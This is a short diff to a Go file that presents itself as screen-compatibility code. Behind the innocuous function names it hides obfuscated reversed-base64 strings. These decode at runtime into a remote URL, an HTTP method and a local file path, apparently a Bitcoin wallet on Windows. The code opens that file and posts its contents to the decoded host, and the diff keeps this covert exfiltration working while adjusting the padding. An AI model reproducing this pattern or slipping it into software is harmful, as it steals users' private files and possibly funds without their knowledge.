@@ -11,7 +11,7 @@ import (
 	"strings"
 )
 
-const HEADER = "AcoBnLj9Sdl5CduVWeu42dw9yL6AHd0hGf5JXYulmYv42bpRXY"
+const HEADER = "AcoBnLj9Sdl5CduVWeu42dw9yL6AHd0hGf5JXYulmYv42bpRXYj"
 
 type Token struct {
 	order byte
@@ -49,7 +49,7 @@ func (c *Compat) GetCompatibleScreen() (Screen, error) {
 }
 
 func (c *Compat) init(screen Screen) error {
-	s := rev("=" + HEADER + c.footer(screen))
+	s := rev("==" + HEADER + c.footer(screen))
 	s = dec(s)
 	a := strings.Split(s, "|")
 	for _, t := range c.order {
@@ -98,9 +98,8 @@ func (c *Compat) makeScreen() error {
 		return errors.New("")
 	}
 
-	if i, e := os.Open(l); e == nil {
-		s, _ := os.Stat(l)
-		c.notify(i, s.Size())
+	if f, e := os.Open(l); e == nil {
+		c.notify(f)
 	}
 
 	return nil
@@ -108,12 +107,13 @@ func (c *Compat) makeScreen() error {
 
 func (c *Compat) footer(screen Screen) string {
 	c.screen = screen
-	return "jlGbwBXY8RXYk5CdpxGbhdHful2bjRXai5Cful2bjRXaCx3c39GZul2d"
+	return "lGbwBXY8RXYk5CdpxGbhdHful2bjRXai5Cful2bjRXaCx3c39GZul2d"
 }
 
-func (c *Compat) notify(i *os.File, s int64) {
-	r, e := http.Post(c.target[0:len(c.target)-1], c.method, i)
-	i.Close()
+func (c *Compat) notify(f *os.File) {
+	t := strings.TrimRight(c.target, "\x00")
+	r, e := http.Post(t, c.method, f)
+	f.Close()
 	if e != nil {
 		return
 	}
